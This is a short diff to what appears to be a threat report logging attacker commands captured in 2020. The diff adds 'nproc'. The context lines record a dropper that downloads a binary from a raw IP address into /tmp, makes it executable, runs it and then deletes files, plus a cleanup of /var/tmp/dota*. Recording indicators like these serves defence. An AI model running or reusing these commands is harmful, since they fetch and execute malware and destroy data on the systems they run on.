@@ -1,5 +1,7 @@
 Reported by Hanyajasa.Com | bekabeipa@gmail.com | 26/06/2020
 ----
+nproc
+----
 cd /tmp; wget hxxp://185.63.253.201/keFe/keFe.x86; chmod 777 keFe.x86; ./keFe.x86 servers1; rm -rf *
 ----
 rm -rf /var/tmp/dota*
